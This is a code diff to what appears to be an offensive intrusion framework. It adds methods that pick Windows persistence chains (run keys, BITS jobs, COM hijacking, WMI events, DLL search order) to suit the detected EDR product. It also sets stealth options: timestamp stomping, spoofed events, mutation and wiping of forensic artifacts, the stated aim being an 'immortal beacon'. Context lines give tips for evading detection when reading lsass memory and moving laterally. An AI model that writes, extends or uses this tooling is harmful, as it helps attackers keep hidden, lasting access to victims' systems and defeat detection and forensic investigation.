@@ -94,6 +94,25 @@ except ImportError:
     SyscallObfuscatorMonster = None
     SyscallObfuscationLayer = None
 
+# NEW: Persistence God Monster entegrasyonu
+try:
+    from evasion.persistence_god import (
+        PersistenceGodMonster,
+        AIPersistenceSelector,
+        PersistenceChainExecutor,
+        PersistenceChain,
+        EDRPersistProfile,
+        PersistenceConfig,
+        EDR_PERSISTENCE_PROFILES,
+        create_persistence_god,
+        get_ai_persist_recommendation
+    )
+    HAS_PERSISTENCE_GOD = True
+except ImportError:
+    HAS_PERSISTENCE_GOD = False
+    PersistenceGodMonster = None
+    PersistenceChain = None
+
 # Try to import LLM engine
 try:
     from cybermodules.llm_engine import LLMEngine
@@ -2234,5 +2253,246 @@ Return as JSON array.
             result['notes'].append('NtReadVirtualMemory on lsass triggers alerts - use spoof heavily')
         elif operation == 'lateral_move':
             result['notes'].append('NtCreateFile for remote writes is suspicious - add timing jitter')
+        
+        return result
+    
+    # =========================================================================
+    # PERSISTENCE GOD MODE GUIDANCE
+    # =========================================================================
+    
+    def get_persistence_recommendation(self, target: str = None) -> Dict[str, Any]:
+        """
+        Get AI-guided persistence chain recommendation.
+        
+        Analyzes target defenses and recommends optimal persistence chain.
+        
+        Args:
+            target: Target hostname (optional, for context)
+        
+        Returns:
+            Dict with:
+            - detected_edr: Primary EDR detected
+            - primary_chain: Recommended persistence chain
+            - secondary_chains: Additional chains for resilience
+            - avoid_chains: Chains to avoid for this EDR
+            - mutation_rate: Artifact mutation rate
+            - spoof_events: Whether to generate spoof events
+            - recommendation: Human-readable recommendation
+        """
+        result = {
+            'detected_edr': 'None',
+            'primary_chain': 'runkey',
+            'secondary_chains': [],
+            'avoid_chains': [],
+            'mutation_rate': 0.5,
+            'use_reg_muting': True,
+            'timestamp_stomp': True,
+            'spoof_events': True,
+            'install_delay_ms': [1000, 5000],
+            'recommendation': 'Default persistence chain',
+            'error': None,
+        }
+        
+        if not HAS_PERSISTENCE_GOD:
+            result['error'] = 'Persistence god module not available'
+            result['recommendation'] = 'Install persistence_god module'
+            return result
+        
+        try:
+            # Use AI selector
+            selector = AIPersistenceSelector()
+            chain, profile_info = selector.detect_and_select()
+            
+            profile = profile_info.get('profile', {})
+            edr = profile_info.get('edr', EDRPersistProfile.NONE)
+            
+            result['detected_edr'] = profile.get('name', 'None')
+            result['primary_chain'] = chain.value
+            result['secondary_chains'] = [c.value for c in profile.get('secondary_chains', [])]
+            result['avoid_chains'] = [c.value for c in profile.get('avoid_chains', [])]
+            result['mutation_rate'] = profile.get('mutation_rate', 0.5)
+            result['use_reg_muting'] = profile.get('use_reg_muting', True)
+            result['timestamp_stomp'] = profile.get('timestamp_stomp', True)
+            result['spoof_events'] = profile.get('spoof_events', True)
+            result['install_delay_ms'] = list(profile.get('install_delay_ms', (1000, 5000)))
+            result['recommendation'] = profile.get('notes', 'AI-selected persistence')
+            
+            # Get full recommendation text
+            result['full_recommendation'] = selector.get_recommendation()
+            
+        except Exception as e:
+            result['error'] = str(e)
+            result['recommendation'] = f'Persistence guidance failed: {e}'
+        
+        return result
+    
+    def create_persistence_god(
+        self,
+        target: str = None,
+        ai_adaptive: bool = True,
+        multi_chain: bool = True,
+        enable_spoof: bool = True
+    ):
+        """
+        Create a PersistenceGodMonster with AI-recommended settings.
+        
+        Args:
+            target: Target host for context
+            ai_adaptive: Use AI-adaptive chain selection
+            multi_chain: Install multiple persistence chains
+            enable_spoof: Enable spoof event generation
+        
+        Returns:
+            Configured PersistenceGodMonster instance or None
+        """
+        if not HAS_PERSISTENCE_GOD:
+            return None
+        
+        try:
+            # Get AI recommendation first
+            rec = self.get_persistence_recommendation(target)
+            
+            # Build config
+            config = PersistenceConfig(
+                ai_adaptive=ai_adaptive,
+                enable_multi_chain=multi_chain,
+                enable_spoof_events=enable_spoof,
+                mutation_rate=rec.get('mutation_rate', 0.7),
+                use_reg_muting=rec.get('use_reg_muting', True),
+                timestamp_stomp=rec.get('timestamp_stomp', True),
+            )
+            
+            return PersistenceGodMonster(config)
+            
+        except Exception as e:
+            self.log_action("persistence_god_create", f"Failed: {e}")
+            return None
+    
+    def recommend_persistence_for_scenario(
+        self,
+        scenario: str,
+        target: str = None,
+        high_value: bool = True
+    ) -> Dict[str, Any]:
+        """
+        Get persistence recommendation for specific scenario.
+        
+        Args:
+            scenario: Scenario type (e.g., "post_lateral", "initial_access", "long_term")
+            target: Target hostname
+            high_value: Whether this is a high-value target requiring max stealth
+        
+        Returns:
+            Dict with scenario-specific persistence guidance
+        """
+        result = {
+            'scenario': scenario,
+            'target': target,
+            'recommended_chain': 'bits_job',
+            'multi_chain': True,
+            'chains_to_use': [],
+            'persistence_settings': {},
+            'opsec_requirements': [],
+            'notes': [],
+            'estimated_survival_score': 0.85,
+        }
+        
+        # Get base recommendation
+        base_rec = self.get_persistence_recommendation(target)
+        
+        # Scenario-specific settings
+        scenario_configs = {
+            'initial_access': {
+                'recommended_chain': 'runkey',
+                'multi_chain': False,
+                'chains': ['runkey'],
+                'notes': ['Quick install for initial foothold', 'Low profile'],
+            },
+            'post_lateral': {
+                'recommended_chain': 'bits_job',
+                'multi_chain': True,
+                'chains': ['bits_job', 'com_hijack', 'runkey'],
+                'notes': ['Multi-chain for resilience', 'Spread across techniques'],
+            },
+            'long_term': {
+                'recommended_chain': 'full_chain',
+                'multi_chain': True,
+                'chains': ['wmi_event', 'com_hijack', 'bits_job', 'schtask', 'runkey'],
+                'notes': ['Maximum resilience', 'All chains for immortal beacon'],
+            },
+            'high_security': {
+                'recommended_chain': 'com_hijack',
+                'multi_chain': True,
+                'chains': ['com_hijack', 'dll_search'],
+                'notes': ['Avoid obvious persistence', 'DLL-based is stealthiest'],
+            },
+        }
+        
+        config = scenario_configs.get(scenario, scenario_configs['post_lateral'])
+        
+        result['recommended_chain'] = config['recommended_chain']
+        result['multi_chain'] = config['multi_chain']
+        result['chains_to_use'] = config['chains']
+        result['notes'] = config['notes']
+        
+        # Apply EDR-specific adjustments
+        if base_rec['detected_edr'] != 'None':
+            result['chains_to_use'] = [
+                c for c in result['chains_to_use'] 
+                if c not in base_rec['avoid_chains']
+            ]
+            result['notes'].append(f"EDR detected: {base_rec['detected_edr']}")
+            result['notes'].append(f"Avoiding: {base_rec['avoid_chains']}")
+        
+        # High value target adjustments
+        if high_value:
+            result['persistence_settings'] = {
+                'mutation_rate': max(base_rec['mutation_rate'], 0.9),
+                'use_reg_muting': True,
+                'timestamp_stomp': True,
+                'spoof_before': True,
+                'spoof_after': True,
+                'artifact_wipe': True,
+            }
+            result['opsec_requirements'] = [
+                'Enable maximum mutation',
+                'Spoof events before and after install',
+                'Timestamp stomp all artifacts',
+                'Wipe forensic artifacts',
+                'Reseed mutator after install',
+            ]
+        else:
+            result['persistence_settings'] = {
+                'mutation_rate': base_rec['mutation_rate'],
+                'use_reg_muting': base_rec['use_reg_muting'],
+                'timestamp_stomp': base_rec['timestamp_stomp'],
+                'spoof_before': False,
+                'spoof_after': True,
+                'artifact_wipe': True,
+            }
+        
+        # Calculate survival score
+        chain_scores = {
+            'full_chain': 0.96,
+            'wmi_event': 0.90,
+            'com_hijack': 0.88,
+            'bits_job': 0.85,
+            'dll_search': 0.82,
+            'schtask': 0.75,
+            'runkey': 0.65,
+            'service': 0.60,
+            'startup_folder': 0.50,
+        }
+        
+        result['estimated_survival_score'] = chain_scores.get(
+            result['recommended_chain'], 0.70
+        )
+        
+        # Bonus for multi-chain
+        if result['multi_chain']:
+            result['estimated_survival_score'] = min(
+                result['estimated_survival_score'] + 0.05 * len(result['chains_to_use']),
+                0.96
+            )
         
         return result
